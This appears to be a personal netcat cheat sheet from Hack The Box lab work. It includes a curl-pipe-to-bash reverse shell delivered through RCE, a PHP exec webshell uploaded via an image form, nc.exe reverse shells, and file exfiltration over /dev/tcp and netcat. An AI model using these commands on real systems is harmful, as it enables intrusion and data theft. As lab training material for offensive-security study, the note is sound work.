# 💢 nc

Tags: #💢
Related to:
See also: [[powercat]], [[socat]]
Previous: [[Getting Started]], [[Footprinting]]

## Description

TCP/IP swiss army knife.

## Usage Examples

### Connect to a host

	nc localhost 6379

### Setup listener to receive reverse shell

	nc -lvnp 9001

Use RCE to execute reverse shell script.

	http://10.129.171.59/templates/protostar/htb.php?pwn=curl 10.10.17.201/reverse_shell.sh | bash

```nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.17.201] from (UNKNOWN) [10.129.171.59] 37656
bash: cannot set terminal process group (1542): Inappropriate ioctl for device
bash: no job control in this shell
www-data@curling:/var/www/html/templates/protostar$
```

### Harvest banners from CIDR /24 range for given port-range

	for i in {0..255};
		do nc -nvw2 192.168.0.$i [port-range];
		done

### Leverage a PHP vulnerability to get a reverse shell

The registration form has the option to upload an image. Save the below code to shell.php and upload it using the form.

	vi shell.php

```
<?php echo exec($_GET["cmd"]);?>
```

Click on Submit to complete registration and upload the webshell. The web shell can be accessed at:

	proxychains firefox http://172.16.1.13/discuss/ups/shell.php?cmd=whoami	// dante-ws01\gerald

Let's upgrade to a proper shell. Upload netcat to target:

	ifconfig tun0										// local IP 10.10.16.52
	cd "/home/kali/HTB/Pro Labs/Dante/www"
	cp /usr/share/windows-resources/binaries/nc.exe .
	python3 -m http.server 80
	
	proxychains firefox http://172.16.1.13/discuss/ups/shell.php?cmd=powershell wget 10.10.16.52/nc.exe -o nc.exe

	nc -lvnp 9001	// locally
	
	proxychains firefox http://172.16.1.13/discuss/ups/shell.php?cmd=nc.exe -e cmd.exe 10.10.16.52 9001

```
Microsoft Windows [Version 10.0.18363.900]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\discuss\ups>
```

### Exfiltrate file

Let's get SERVER.EXE onto our running machine and see if we can extract some credentials from the binary:

	nc -lvnp 3333 > server.exe						// locally
	nc.exe 10.10.16.52 3333 < C:\Apps\SERVER.EXE	// remotely

### Transfer file

Transfer chisel to DANTE-WEB-NIX01:

	nc -lvnp 80 < chisel	// in my Dante/www
	bash -c "cat < /dev/tcp/10.10.16.52/80 > chisel"

	nc -lvnp 80 < nmap						// kali
	cat < /dev/tcp/10.10.16.12/80 > nmap	// target

# References